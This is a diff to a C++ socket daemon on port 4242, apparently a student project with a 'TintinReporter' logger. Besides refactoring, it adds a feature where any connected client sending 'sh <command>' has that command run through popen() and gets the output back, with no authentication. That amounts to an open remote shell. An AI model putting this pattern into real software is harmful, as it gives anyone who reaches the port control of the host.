@@ -1,19 +1,25 @@
 #include "../includes/Server.class.hpp"
 #include "../includes/main.hpp"
 #include <arpa/inet.h> //close
+#include <array>
+#include <cstdio>
 #include <errno.h>
 #include <format>
+#include <iostream>
+#include <memory>
 #include <netinet/in.h>
+#include <stdexcept>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h> //strlen
+#include <string>
 #include <sys/socket.h>
 #include <sys/time.h> //FD_SET, FD_ISSET, FD_ZERO macros
 #include <sys/types.h>
 #include <unistd.h> //close
-
 #define PORT 4242
 #define MAX_CLIENT 3
+extern TintinReporter g_report;
 
 Server::Server() : stream(0), addr(0), mode(ShellMode::None) {}
 Server::Server(Server const &config) { *this = config; }
@@ -25,7 +31,20 @@ Server &Server::operator=(Server const &rhs) {
 }
 Server::~Server() {}
 
-void Server::run(TintinReporter report) {
+std::string exec(const char *cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+void Server::run() {
 
     int opt = true;
     int server_fd, addrlen, i;
@@ -87,17 +106,17 @@ void Server::run(TintinReporter report) {
                                      (socklen_t *)&addrlen)) < 0)
                 unlock_file_and_exit(EXIT_FAILURE);
             if (connected_clients >= MAX_CLIENT) {
-                report.log(LogInfo::Warn, "Already 3 clients connected");
+                g_report.log(LogInfo::Warn, "Already 3 clients connected");
                 if (send(new_socket, "Already 3 clients connected\r\n",
                          strlen("Already 3 clients connected\r\n"), 0) == -1)
                     perror("send");
                 close(new_socket);
                 continue;
             } else {
-                report.log(LogInfo::Info,
-                           std::format("Connecting to new address : {}:{}",
-                                       inet_ntoa(address.sin_addr),
-                                       ntohs(address.sin_port)));
+                g_report.log(LogInfo::Info,
+                             std::format("Connecting to new address : {}:{}",
+                                         inet_ntoa(address.sin_addr),
+                                         ntohs(address.sin_port)));
                 connected_clients += 1;
             }
 
@@ -118,10 +137,10 @@ void Server::run(TintinReporter report) {
                     // Somebody disconnected , get his details and print
                     getpeername(client_fd, (struct sockaddr *)&address,
                                 (socklen_t *)&addrlen);
-                    report.log(LogInfo::Info,
-                               std::format("Host disconnected : {}:{}",
-                                           inet_ntoa(address.sin_addr),
-                                           ntohs(address.sin_port)));
+                    g_report.log(LogInfo::Info,
+                                 std::format("Host disconnected : {}:{}",
+                                             inet_ntoa(address.sin_addr),
+                                             ntohs(address.sin_port)));
 
                     connected_clients -= 1;
                     // Close the socket and mark as 0 in list for reuse
@@ -129,25 +148,41 @@ void Server::run(TintinReporter report) {
                     client_socket[i] = 0;
                 }
 
-                // Echo back the message that came in
                 else {
-                    // set the string terminating NULL byte on the end
-                    // of the data read
                     buffer[msg_size] = '\0';
-                    if (strcmp("quit\n", buffer) == 0) {
+                    if (!strcmp("quit\n", buffer)) {
                         send(client_fd, "exiting client\r\n",
                              strlen("exiting client\r\n"), 0);
-                        report.log(LogInfo::Info,
-                                   std::format("Host disconnected : {}:{}",
-                                               inet_ntoa(address.sin_addr),
-                                               ntohs(address.sin_port)));
+                        g_report.log(LogInfo::Info,
+                                     std::format("Host disconnected : {}:{}",
+                                                 inet_ntoa(address.sin_addr),
+                                                 ntohs(address.sin_port)));
                         connected_clients -= 1;
                         if (close(client_fd) == -1)
                             unlock_file_and_exit(EXIT_FAILURE);
                         client_socket[i] = 0;
                         continue;
                     } else {
-                        report.log(LogInfo::Info, buffer);
+                        char cpy[4];
+
+                        strncpy(cpy, buffer, 3);
+                        cpy[3] = 0;
+                        if (!strcmp("sh ", cpy)) {
+                            std::string str_cpy = buffer + 3;
+                            if (!str_cpy.empty() &&
+                                str_cpy[str_cpy.length() - 1] == '\n') {
+                                str_cpy.erase(str_cpy.length() - 1);
+                            }
+                            g_report.log(
+                                LogInfo::Info,
+                                std::format("new command : `{}`", str_cpy));
+                            std::string res = exec(str_cpy.c_str());
+                            send(client_fd, res.c_str(), res.length(), 0);
+                            g_report.log(LogInfo::Info,
+                                         std::format("res : `{}`", res));
+                        } else {
+                            g_report.log(LogInfo::Info, buffer);
+                        }
                     }
                 }
             }
